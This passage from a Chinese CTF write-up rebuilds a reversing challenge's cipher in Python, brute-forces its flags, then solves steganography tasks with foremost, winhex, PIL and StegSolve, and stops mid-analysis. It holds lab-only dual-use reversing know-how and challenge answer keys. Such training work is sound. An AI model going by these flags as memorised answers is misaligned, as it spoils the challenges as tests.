loc_4AC46E：如果ZF标志位被设置，则跳转到loc_4AC46E处执行代码。\nmovzx edx, dil：将dil寄存器的值零扩展到edx寄存器中。\nmovzx eax, sil：将sil寄存器的值零扩展到eax寄存器中。\nmov ebx, edx：将edx寄存器中的值移动到ebx寄存器中。\nxor edx, edx：将edx寄存器中的值与自己进行异或运算，将结果存回edx寄存器中。这通常用于将寄存器中的值清零。\ndiv bx：将ax寄存器中的值除以bx寄存器中的值，商存储在ax寄存器中，余数存储在dx寄存器中。\nlea esi, [rdx+rcx]：计算rdx和rcx的和，并将结果存储在esi寄存器中。这里使用了LEA（Load Effective Address）指令，它可以将任意两个操作数的和或差计算出来并存储到目标寄存器中。\nlea esi, [rsi-1]：将esi寄存器中的值减1，并将结果存回esi寄存器\n```\n\n这里esi的值就是最后比较时v10的值，根据红框部分可得\n\nesi = rdx + rcx - 1\n\n所以找rdx和rcx即可(edx ecx)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/iYuOvAbY34cDIIXH1710404965.png)\n\n取rbx（keytable表） 的第rdx（0）位内容给ecx(0x41) 找到了第一个rcx的内容\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/28FNBxpAMj1Z2fTV1710404965.png)\n\n运行到movzx edx,dil时 观察edx的值为**0x7a**\n\n运行到lea esi,[rdx+rcx]时 观察edx的值为**0x65**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/H0aGiqfIgeGbp4SJ1710404966.png)\n\n最后esi的值为 0x65 + 0x41  - 1 = 165 (0xA5)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/eOxW2150rQsxCwia1710404966.png)\n\n运行到判断处，观察v55的值发现为\\xA5\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/hLpzY5KIrqQXJG291710404966.png)\n\n至此我们就可以得到判断左边的变量就是esi寄存器的内容 也就是 rcx 和 rdx 相加 -1的结果。\n\n在上面的步骤中，rdx从0x7a 变到 0x65 是因为运行了**div bx**后，根据解读 div bx 会**将eax % ebx的结果储存至edx寄存器**中，这里对应的就是0xDF(223) % 0x7a(122) = 0x65(101)\n\n所以在这个例子中，我们就可以得到 v55的内容 为 **(v11 % v12) + keytable[0] - 1**：\n\n```\nv8 = (qword_58EE18-1)//qword_58EE18 # 0\nv9 = (qword_58EE18-1)%qword_58EE18 # 57\nv11 = 0xAB + ((0xf+0x66-65) % 58) ^ (main_keyTable[(0xf+0x66-65) % 58]) - 65 # 0xDF 223\nv12 = v9 ^ (keytable[v9]) # 0x7A 122\n# main_keyTable[0] = 65\nv55 = (v11 % v12) + main_keyTable[0] - 1 # 0xA5 165\n```\n\n###### 小总结\n\n当运行至main_getCryptOne函数时，会将v9传入，v9的高低地址由以循环次数为x x ^main_key[x]和我们输入的内容组成\n\n将v9的高地址与offset和keytable进行计算，再与122取模，最后在 + 65 - 1，便得到了v10的变量内容。\n\n要求我们传入后，v10和低地址（输入的内容）相同，这里也是解出flag的关键。\n\n至此，我们搞明白了v10是什么东西，和程序的运行逻辑，调试工作到此结束。\n\n\n\n#### Python代码还原加密\n\n代码大致还原了下，不得不说还原代码在逆向中也是一个大工程，非常的麻烦。\n\n##### main_getCryptOne加密部分\n\n```python\ndef encode(v12,offset):\n    global v3,v13,x\n    v1 = (qword_58EE18-1)//qword_58EE18\n    v2 = (qword_58EE18-1)%qword_58EE18\n\n    x = ((offset + v12[1] - 65) % qword_58EE18)\n    v3 = v12[0] + (x ^ (keytable[x])) - 65\n\n    v4 = v2 ^ keytable[v2]\n    if v3>v4:\n        v13 = v3 % v4\n    result = keytable[0] + v13 - 1 \n    return result\n```\n\n##### main_CalcGoffset计算偏移\n\n```python\ndef getoffset(a1):\n    v1 = 0\n    for i in range(len(a1)):\n        v1 += ord(a1[i])\n    offset = v1 % qword_58EE18\n    return offset\n```\n\n##### main函数\n\n这里的v12高地址和低地址 用数组的方式存储 1为低地址 0为高地址\n\n```python\ndef crypt_encode():\n    \"\"\"\n    加密\n    \"\"\"\n    v7 = [0]*2 # 这是用户所输入的key和flag 程序要求flag大小为16\n    v7[0] = str(input('Input key:'))\n    v7[1] = str(input('Input flag:'))\n    res = ''\n    v8 = 0\n    s = 0\n    v9 = v7[0]\n    v12 = [0,0]\n    offset = getoffset(v9)\n    print(f\"[+] Offset: {offset} {hex(offset)}\")\n    while len(v7[1]) > v8:\n        if(qword_58EDD8):\n            v9 = v7[0]\n            if (v8 % qword_58EDD8 >= qword_58EDD8):\n                break\n            v10 = (v8 % qword_58EDD8) ^ main_flag[v8 % qword_58EDD8]\n            v12[1] = int(hex(ord(v7[1][v8])),16) # 低地址\n            v12[0] = int(hex((v8 % qword_58EDF8) ^ main_key[v8 % qword_58EDF8]),16) # 高地址\n            v13 = encode(v12,offset)\n            if v13 == v10:\n                print(f\"[success] v11 : {v3}({hex(v3)})  | (判断左侧)v55 : {v13}({hex(v13)}) | (判断右侧)v32 : {v10}({hex(v10)}) |(偏移量)x : {x}\")\n                res += v7[1][v8]\n                print(f'[{v8+1}] 输入:{v7[1]} 正确部分:{res}\\n\\n')\n                s += 1\n            v8 += 1\n    if s == len(main_flag):\n        print('Input key:%s\\nInput flag:%s\\nRight flag! flag{%s}'%(v7[0],v7[1],res))\n```\n\n##### 运行\n\n```python\nqword_58EE18 = 0x3A\nmain_flag = [113, 161, 150, 97, 148, 103, 116, 121, 96, 134, 142, 102, 173, 135, 137, 81]\nmain_key = [171, 182, 148, 143, 164, 147, 170, 167, 145, 154, 180, 147, 0, 0, 0, 0, 0, 68, 1, 0, 70, 70, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0]\nkeytable = [65, 67, 65, 71, 65, 67, 65, 79, 65, 67, 65, 71, 65, 67, 65, 95, 65, 67, 65, 71, 65, 67, 65, 79, 65, 67, 65, 71, 65, 67, 65, 127, 65, 67, 65, 71, 65, 67, 65, 79, 65, 67, 65, 71, 65, 67, 65, 95, 65, 67, 65, 71, 65, 67, 65, 79, 65, 67, 0, 0, 0, 0, 0, 0, 0, 8, 1, 0, 5, 8, 1, 0, 1, 0, 0, 0, 8, 8, 1, 0, 10, 8, 1, 0, 2, 0, 0, 0, 11, 8, 1, 0, 53, 8, 1, 0, 1, 0, 0, 0, 55, 8, 1, 0, 56, 8, 1, 0, 1, 0, 0, 0, 60, 8, 1, 0, 63, 8, 1, 0, 3, 0, 0, 0, 0, 0, 0, 0, 0, 188, 1, 0, 106, 188, 1, 0, 1, 0, 0, 0, 112, 188, 1, 0, 124, 188, 1, 0, 1, 0, 0, 0, 128, 188, 1, 0, 136, 188, 1, 0, 1, 0, 0, 0, 144, 188, 1, 0, 153, 188, 1, 0, 1, 0, 0, 0, 156, 188, 1, 0, 159, 188, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 224, 1, 0, 6, 224, 1, 0, 1, 0, 0, 0, 8, 224, 1, 0, 24, 224, 1, 0, 1, 0, 0, 0, 27, 224, 1, 0, 33, 224, 1, 0, 1, 0, 0, 0, 35, 224, 1, 0, 36, 224, 1, 0, 1, 0, 0, 0, 38, 224, 1, 0, 42, 224, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0]\nqword_58EDD8 = 0x10\nqword_58EDF8 = 0xC\ncrypt_encode(v7)\n```\n\n**运行结果：**\n\n```python\nInput key:s\nInput flag:BezRlHBZKxBQrOmN\n[+] Offset: 57 0x39\n[success] v11 : 171(0xab)  | (判断左侧)v55 : 113(0x71) | (判断右侧)v32 : 113(0x71) |(偏移量)x : 0\n[1] 输入:BezRlHBZKxBQrOmN 正确部分:B\n\n\n[success] v11 : 218(0xda)  | (判断左侧)v55 : 160(0xa0) | (判断右侧)v32 : 160(0xa0) |(偏移量)x : 35\n[2] 输入:BezRlHBZKxBQrOmN 正确部分:Be\n\n\n[success] v11 : 206(0xce)  | (判断左侧)v55 : 148(0x94) | (判断右侧)v32 : 148(0x94) |(偏移量)x : 56\n[3] 输入:BezRlHBZKxBQrOmN 正确部分:Bez\n\n\n[success] v11 : 156(0x9c)  | (判断左侧)v55 : 98(0x62) | (判断右侧)v32 : 98(0x62) |(偏移量)x : 16\n[4] 输入:BezRlHBZKxBQrOmN 正确部分:BezR\n\n\n[success] v11 : 202(0xca)  | (判断左侧)v55 : 144(0x90) | (判断右侧)v32 : 144(0x90) |(偏移量)x : 42\n[5] 输入:BezRlHBZKxBQrOmN 正确部分:BezRl\n\n\n[success] v11 : 156(0x9c)  | (判断左侧)v55 : 98(0x62) | (判断右侧)v32 : 98(0x62) |(偏移量)x : 6\n[6] 输入:BezRlHBZKxBQrOmN 正确部分:BezRlH\n\n\n[success] v11 : 172(0xac)  | (判断左侧)v55 : 114(0x72) | (判断右侧)v32 : 114(0x72) |(偏移量)x : 0\n[7] 输入:BezRlHBZKxBQrOmN 正确部分:BezRlHB\n\n\n[success] v11 : 184(0xb8)  | (判断左侧)v55 : 126(0x7e) | (判断右侧)v32 : 126(0x7e) |(偏移量)x : 24\n[8] 输入:BezRlHBZKxBQrOmN 正确部分:BezRlHBZ\n\n\n[success] v11 : 162(0xa2)  | (判断左侧)v55 : 104(0x68) | (判断右侧)v32 : 104(0x68) |(偏移量)x : 9\n[9] 输入:BezRlHBZKxBQrOmN 正确部分:BezRlHBZK\n\n\n[success] v11 : 201(0xc9)  | (判断左侧)v55 : 143(0x8f) | (判断右侧)v32 : 143(0x8f) |(偏移量)x : 54\n[10] 输入:BezRlHBZKxBQrOmN 正确部分:BezRlHBZKx\n\n\n[success] v11 : 190(0xbe)  | (判断左侧)v55 : 132(0x84) | (判断右侧)v32 : 132(0x84) |(偏移量)x : 0\n[11] 输入:BezRlHBZKxBQrOmN 正确部分:BezRlHBZKxB\n\n\n[success] v11 : 167(0xa7)  | (判断左侧)v55 : 109(0x6d) | (判断右侧)v32 : 109(0x6d) |(偏移量)x : 15\n[12] 输入:BezRlHBZKxBQrOmN 正确部分:BezRlHBZKxBQ\n\n\n[success] v11 : 219(0xdb)  | (判断左侧)v55 : 161(0xa1) | (判断右侧)v32 : 161(0xa1) |(偏移量)x : 48\n[13] 输入:BezRlHBZKxBQrOmN 正确部分:BezRlHBZKxBQr\n\n\n[success] v11 : 196(0xc4)  | (判断左侧)v55 : 138(0x8a) | (判断右侧)v32 : 138(0x8a) |(偏移量)x : 13\n[14] 输入:BezRlHBZKxBQrOmN 正确部分:BezRlHBZKxBQrO\n\n\n[success] v11 : 193(0xc1)  | (判断左侧)v55 : 135(0x87) | (判断右侧)v32 : 135(0x87) |(偏移量)x : 43\n[15] 输入:BezRlHBZKxBQrOmN 正确部分:BezRlHBZKxBQrOm\n\n\n[success] v11 : 152(0x98)  | (判断左侧)v55 : 94(0x5e) | (判断右侧)v32 : 94(0x5e) |(偏移量)x : 12\n[16] 输入:BezRlHBZKxBQrOmN 正确部分:BezRlHBZKxBQrOmN\n\n\nInput key:s\nInput flag:BezRlHBZKxBQrOmN\nRight flag! flag{BezRlHBZKxBQrOmN}\n```\n\n\n\n#### Python代码解密程序\n\n##### 解密思路\n\n因为加密的部分与offset和输入的内容有关，offset的范围在**0-57**，这个值是可以爆破的。同时也代表着，我们输入的key只有一个与flag配对的作用，没有关键的作用，因为我们只要爆破0-57就可以得到偏移 key可以逆推得到。\n\n而我们输入的内容也可以爆破，爆破范围**32-127**所有可打印字符即可\n\n最后写一个判断，将得到的结果与输入的字符比对，如果正确则返回字符\n\n因为flag长度为16，所以我们将字符串没有空的部分筛选出来，就是正确的flag和key\n\n##### 解密代码\n\n这里就是一个爆破offset 然后每一个偏移量在循环16次 得到flag的内容\n\n而decode函数每一次又会遍历字母表\n\n所以当res[i] 16个元素都不为空时 就会打印key（这里key就是offset + 0x3a）和offset 以及flag内容\n\n```python\ndef decode(offset,ind):\n    table = (string.ascii_letters + string.digits).encode()\n    for i in table:\n        x = (offset + i - 65) % 0x3A\n        v3 = (main_key[ind % qword_58EDF8] ^ (ind % qword_58EDF8)) + (x ^ keytable[x]) - 65\n        if (v3%122) + 65 - 1 == main_flag[ind] ^ ind:\n            return (chr(i))\n        \ndef crypt_decode():\n    \"\"\"\n    解密\n    \"\"\"\n    for offset in range(0x3a): # 因为偏移是模58 所以遍历偏移0-57即可\n        res = [0]*16\n        for i in range(16): # flag长度16位\n            res[i] = decode(offset,i)\n        if None not in res:\n            print('key: %s offset: %s flag:%s'%(chr(offset+0x3a),offset,''.join(res)))\n            \nqword_58EE18 = 0x3A\nmain_flag = [113, 161, 150, 97, 148, 103, 116, 121, 96, 134, 142, 102, 173, 135, 137, 81]\nmain_key = [171, 182, 148, 143, 164, 147, 170, 167, 145, 154, 180, 147, 0, 0, 0, 0, 0, 68, 1, 0, 70, 70, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0]\nkeytable = [65, 67, 65, 71, 65, 67, 65, 79, 65, 67, 65, 71, 65, 67, 65, 95, 65, 67, 65, 71, 65, 67, 65, 79, 65, 67, 65, 71, 65, 67, 65, 127, 65, 67, 65, 71, 65, 67, 65, 79, 65, 67, 65, 71, 65, 67, 65, 95, 65, 67, 65, 71, 65, 67, 65, 79, 65, 67, 0, 0, 0, 0, 0, 0, 0, 8, 1, 0, 5, 8, 1, 0, 1, 0, 0, 0, 8, 8, 1, 0, 10, 8, 1, 0, 2, 0, 0, 0, 11, 8, 1, 0, 53, 8, 1, 0, 1, 0, 0, 0, 55, 8, 1, 0, 56, 8, 1, 0, 1, 0, 0, 0, 60, 8, 1, 0, 63, 8, 1, 0, 3, 0, 0, 0, 0, 0, 0, 0, 0, 188, 1, 0, 106, 188, 1, 0, 1, 0, 0, 0, 112, 188, 1, 0, 124, 188, 1, 0, 1, 0, 0, 0, 128, 188, 1, 0, 136, 188, 1, 0, 1, 0, 0, 0, 144, 188, 1, 0, 153, 188, 1, 0, 1, 0, 0, 0, 156, 188, 1, 0, 159, 188, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 224, 1, 0, 6, 224, 1, 0, 1, 0, 0, 0, 8, 224, 1, 0, 24, 224, 1, 0, 1, 0, 0, 0, 27, 224, 1, 0, 33, 224, 1, 0, 1, 0, 0, 0, 35, 224, 1, 0, 36, 224, 1, 0, 1, 0, 0, 0, 38, 224, 1, 0, 42, 224, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0]\nqword_58EDD8 = 0x10\nqword_58EDF8 = 0xC\ncrypt_decode()\n```\n\n**运行结果：**\n\n```python\nkey: : offset: 0 flag:AdyQkGAYJwAPqNlM\nkey: ; offset: 1 flag:zcxPjFzXIvzOpMkL\nkey: < offset: 2 flag:ybwOiEyWHuyNoLjK\nkey: = offset: 3 flag:xavNhDxVGtxMnKiJ\nkey: D offset: 10 flag:qZoGawqOzmqFgDbC\nkey: k offset: 49 flag:JmHZtPJbSFJYzWuV\nkey: l offset: 50 flag:IlGYsOIaREIXyVtU\nkey: s offset: 57 flag:BezRlHBZKxBQrOmN\n```\n\n这些key和flag输入到程序都是正确的。\n\n由于没有正确答案的原因 所以并不知道这种解法是否正确。这么多flag比赛中可能需要多次尝试。\n\n##### 程序验证\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/M0He42usXC77JfSu1710404966.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/aolZd2hS5a0fnfh31710404967.png)\n\n#### FLAG\n\n```\nflag{AdyQkGAYJwAPqNlM}\nflag{zcxPjFzXIvzOpMkL}\nflag{ybwOiEyWHuyNoLjK}\nflag{xavNhDxVGtxMnKiJ}\nflag{qZoGawqOzmqFgDbC}\nflag{JmHZtPJbSFJYzWuV}\nflag{IlGYsOIaREIXyVtU}\nflag{BezRlHBZKxBQrOmN}\n```\n\n\n\n### 江苏re4-chall（IDA查看获取flag）\n\n#### IDA分析程序\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/LUNQw4aH8ORJtlzn1710404967.png)\n\n```c++\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int i; // [rsp+Ch] [rbp-144h]\n  char v6[48]; // [rsp+10h] [rbp-140h] BYREF\n  char buf[264]; // [rsp+40h] [rbp-110h] BYREF\n  unsigned __int64 v8; // [rsp+148h] [rbp-8h]\n\n  v8 = __readfsqword(0x28u);\n  strcpy(v6, \"flag{b4913ffa-7b79-413c-928f-795eb3a3635e}\");\n  puts(\"input your flag:\");\n  read(0, buf, 0x100uLL);\n  for ( i = 0; i <= 41; ++i )\n  {\n    if ( v6[i] != buf[i] )\n    {\n      printf(\"No, wrong flag\");\n      exit(1);\n    }\n  }\n  printf(\"Yes, you got flag\");\n  return __readfsqword(0x28u) ^ v8;\n}\n```\n\n可以说是最简单的一道逆向了，程序根据用户所输入的进行异或，要求最后与v6字符串相同，而flag直接赋值给了v6字符串。\n\n所以通过反编译，我们直接得到了flag。\n\n#### FLAG\n\n```\nflag{b4913ffa-7b79-413c-928f-795eb3a3635e}\n```\n\n\n\n## 隐写术应用\n\n### *隐藏信息探索（2022河南 新颖题目）\n\n#### 1.  访问服务器的FTP服务，下载图片QR，从图片中获取flag，并将flag提交；\n\n得到附件，是一张打乱的二维码\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/rUkLMXitdvovWbx41710404967.png)\n\n思路就是先 **分割大图的四个小二维码** 然后合并，二维码可能是打乱的 所以还需要尝试 **翻转** 一下二维码。\n\n分割可以用截图工具，不过不是很准确，最好是用python的PIL模块进行处理。\n\n这里分割的w和h分别为 **135 125** 运行然后得到四张小图\n\n```python\nfrom PIL import Image\n\nimg = Image.open('QR.png')\nw,h = img.size\n\nimg.crop((0,0,135,125)).save('r1.png')\nimg.crop((135,0,w,125)).save('r2.png')\nimg.crop((0,125,135,h)).save('r3.png')\nimg.crop((135,125,w,h)).save('r4.png')\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/AAV7jN3iPYUCtGeO1710404967.png)![](http://cdn.anyiblog.top/WriteUp/20240314/Srp8Zz5LJo2fdXUb1710404967.png)![](http://cdn.anyiblog.top/WriteUp/20240314/jc0JuJSveV264NM11710404967.png)![](http://cdn.anyiblog.top/WriteUp/20240314/ob3CRkp7BJ37jZ3c1710404967.png)\n\n小图有白色边框，再用 **画图工具** 进行裁剪：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/2e2MrJouphsZSQCm1710404968.png)\n\n**Ctrl + Shift + X **裁剪，然后 **Ctrl + S** 保存。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/C6smHOtfGQRmzgPi1710404968.png)\n\n这样处理完四张图片后再放到画图里拼大图\n\n1.新建一个大图\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/rzgRxfukmbUDuZOF1710404968.png)\n\n2.导入4张小图\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/xxld5HjkahNDWUDI1710404968.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/fMt1FflcIbQw0v2Z1710404968.png)\n\n[1 2\n\n 3 4]\n\n3.调整位置\n\n能发现左下角的图片和右下角的图片有一部分多出来的黑色部分，可以合并\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/AgqL66WRMrWh8mN41710404968.png)\n\n将左下角图片**水平翻转 -> 垂直翻转**，和右下角图片合并\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/yq5tCVPBBWpj7UK11710404969.png)\n\n然后我们能发现左下角的图片纠错级别为 **H** 即红框部分都为**白色**：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/OkDthS4xkC6vFn7s1710404969.png)\n\n那么根据这个就可以方便去找左上角的二维码了，如果纠错级别为H 那么左上角的图片也应该为**白色**，寻找到符合条件的图片：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/9tfD4NLuxpjLXTSD1710404969.png)\n\n同样 右上角的图片为一白一黑，与左下角的图片对不上 就显然不是了，那么就是左上角的图片 **水平翻转 -> 垂直翻转** 右上角的图片 **水平翻转**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/RrDaLrRQ5fM2XDdM1710404969.png)\n\n虽然这里右上角的图片有些奇怪，但还是可以扫描出来的。\n\n顺序为 **r1 -> r2 -> r3 ->r4** (其实位置没错，就是要翻转)\n\n扫描得到FLAG\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/bMDPJ8gsgwuTdmpO1710404969.png)\n\n##### FLAG1: flag{xqFcT59a7iQw}\n\n#### 2.  访问服务器的FTP服务，下载文件document，从文件中获取flag，并将flag提交；\n\n打开docx文档，发现打不开\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/O0ojTezasgMXfh7X1710404970.png)\n\n改后缀为.zip，然后解压文件。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/s6pBggItYqJ2PWbl1710404970.png)\n\n一般文档的内容文件在 **word/document.xml** 文档下 此时打开文件发现报错\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/q2lXaUmrtmoFJkki1710404970.png)\n\nwinhex分析，发现是PK头 改后缀解压（这里其实每个文件都是一样的，字节大小都一样）\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/WrVsJXKzapbglDWh1710404970.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/HbCMfRf5WKvRwC5X1710404970.png)\n\n这边查找一番所有的xml文件发现都没有flag的信息\n\n那这时候就要想flag是否隐藏在某个xml中，用linux处理下\n\n将word文件夹放到kali里，然后用该命令查看当前目录文件内容是否存在flag字符串\n\n```\nfor i in `ls`;do xxd $i|grep flag;done\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/eTE6SteWz6W5RqSA1710404971.png)\n\n没有结果说明这个文件夹的文件不存在该字符串\n\n再切换到 **theme/** 目录查看\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/WyIgmx5mWohCmAHT1710404971.png)\n\n成功找到flag字符串\n\n##### FLAG2: RFCXQ0gy\n\n#### 3.  访问服务器的FTP服务，下载图片beach，从图片中获取flag，并将flag提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/KlmPJk0BGegASN2s1710404971.jpg)\n\nwinhex分析图片：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/o3Pm9u4swK2RbEJe1710404971.png)\n\n在图片尾发现了隐藏数据，是一个压缩包，使用foremost工具分离\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/jPDgl6A6WgOl6RZG1710404972.png)\n\n打开压缩包发现文件是加密的。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/x07uc09IYmdMdUat1710404972.png)\n\n这时候要猜测 **伪加密** 使用winhex分析\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/LsVVeEXOMJQB1Oes1710404972.png)\n\n能发现加密位都是**奇数位**，将**奇数位修改为偶数位**即可破解伪加密\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/K0JkepAWfOU5KFtC1710404972.png)\n\n保存，再打开文件，但是文件还是存在加密的标识：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/rMzAkG3upKTvwJIf1710404972.png)\n\n那就排除了伪加密这种可能，说明文件需要密码解开，那这个时候就需要重新分析图片 找到隐藏的密码。\n\nforemost分离的时候除了这个压缩包还分离多了一张图片：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/bIAn2RR44ZJOIfZ71710404973.png)\n\n那这个就是解题的关键了，用winhex分析\n\n在文件的下面一部分空数据中发现了一段base64字符串：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/jb5vmwV3qEIOFypC1710404973.png)\n\n```\ndlV0aGJJR2VZSkdzRXVaNjIxbFJTRg==\n```\n\n解密base64，得到密钥 **vUthbIGeYJGsEuZ621lRSF**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/eGfqEcZ8iMXs9Qdc1710404973.png)\n\n使用密钥解开压缩包 得到flag\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/8OaDv8uK0mJxkO1X1710404973.png)\n\n##### FLAG3: flag{nfzgVNXCxibcjxn1}\n\n#### 4.  访问服务器的FTP服务，下载图片grass，从图片中获取flag，并将flag提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/abzsvqLWsrTNv49F1710404973.jpg)\n\nwinhex分析图片，尾部发现了flag，因为是一个压缩包压缩没密码的文本，所以文本内容可以直接看到。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/8S5qm0sy1vBC8nKX1710404973.png)\n\n##### FLAG4: flag{IYS9FWWLY4ACf1o8}\n\n#### 5.  访问服务器的FTP服务，下载图片tree，从图片中获取flag，并将flag提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/KsuTtvBZ8WRNW7nG1710404974.png)\n\nWinhex分析图片，发现没有额外数据\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/jr350UNp7uuINnoa1710404974.png)\n\n文件是一张png图片，png图片需要关注 **宽高、LSB隐写 **等。 **宽高** 的可能比较高\n\n修改高度：先找到图片属性的高度（421）\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/9BfmwEyICe4eoqzv1710404974.png)\n\n然后转换成16进制（0x01a5）\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/iy21v0AYVH0JWGGO1710404974.png)\n\n使用winhex的16进制查找数值 **01a5** 列出搜索结果\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/YH8i9vVXSVIJGcfa1710404975.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Tf4w88CkjwpMvDMj1710404975.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/TZOMXET9KXph8kF51710404975.png)\n\n那么这一块就是图片的高度属性了，我们要修改图片的高度就将这个数值改成大一点的hex值，这里就改成0x07d0（2000）\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/wEGhSiWooz74JIeS1710404975.png)\n\n**Ctrl+S** 保存后打开图片，发现了flag：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/XBnVeaXUH74RdvVx1710404976.png)\n\n##### FLAG5: SwNgVibDLp\n\n#### 6.  访问服务器的FTP服务，下载压缩文件style，从压缩文件中获取flag，并将flag提交。\n\n解压压缩包得到4张图片。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Kou0IFGvwKITt5zm1710404976.png)\n\n拿到jpg图片，还是数量多的情况，一般都有隐写\n\n使用 **foremost** 分离四张图片，能发现每张图片都有额外的一张png图片隐藏。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/qnbXX7yTBzCLBGdo1710404976.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/gK82BQDckAB2WDGA1710404977.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/urPRkBuQucP8Z5x11710404977.png)\n\n每张图片都是flag的部分字符串，将每张图片**拼接**得到FLAG\n\nbamboo.jpg\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/nimlpNKu9Fcwkanr1710404977.png)![](http://cdn.anyiblog.top/WriteUp/20240314/mlHzL0TP4A46yNKj1710404978.png)\n\nchrysanthemum.jpg\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/joTPO92QONVaJDav1710404978.png)\n\norchid.jpg\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/iWYmqCUuNBDOaGHx1710404978.png)\n\nPlum.jpg 没有额外的图片\n\n\n\n拼接得到flag为\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/DNq5oQpxhFIbeNsR1710404978.png)\n\n##### FLAG6: flag{7y6KYC02ZwTAn3a0}\n\n\n\n### *隐写术应用（2022广东）\n\n#### *1.找出文件夹1中的文件，将文件中的隐藏信息作为flag值提交；\n\n**（P10 使用隐写术来防止敏感数据被盗用 原题）**\n\n##### 分析\n\n打开文件夹得到图片文件\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/RVsYo1raZarb4Y6C1710404978.png)\n\n使用winhex分析\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/uIvitvtZwYg1bcU31710404979.png)\n\n图片头和图片尾正常，使用 foremost 工具分离，看看是否存在另一张图片\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/L6PjVMhe0iwUxLqW1710404979.png)\n\n发现了第二张图片，与第一张图片基本相同，这时候来看两张图片的字节 看看是否有字节不同。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/HHEEu9SlYHBhJPg41710404980.png)![](http://cdn.anyiblog.top/WriteUp/20240314/eoTTB9q7kU4Cme9r1710404980.png)\n\n明显能看出来第二张图片的字节更大一些，说明**两张图片不完全相同**\n\n一般遇到两种同样的图片可以考虑 **盲水印** 但这里不是，还有就是尝试将图片 **XOR ADD** 看看是否有像素点不同。\n\n使用 **StegSolve** 打开 **00000000.png** 原始图片。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/BYH1YUW09qlZBIJt1710404980.png)\n\n打开 **Analyse -> Image Combiner**  进行图片比较![](http://cdn.anyiblog.top/WriteUp/20240314/HznjoY8SJEuLTwzR1710404980.png)  \n\n选择分离出来的图片 **00003754.bmp**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/NJrRRSiFHUigb4JK1710404981.png)\n\n然后我们在 **XOR** 模式下发现了一张黑色的图片（黑色是因为相同像素点的16进制进行异或 则为0，0代表的就是黑色。）\n\n能发现如果用肉眼去看是很难发现蹊跷的，所以我们将图片保存至 .bmp 形式 以分析bmp文件是否存在异常数据。（bmp图片会将颜色的RGB值作为16进制写入文件内容）\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/DiSA54jHmmDVIrmy1710404981.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/qsIudpXcaDPGxu6V1710404981.png)\n\nwinhex分析solved.bmp\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/z6p6PCgMNKrXEbHu1710404982.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Z1LO32YG67oGuCzw1710404982.png)\n\n通过分析发现了这段异常数据，我们目前已知该区域的偏移量为 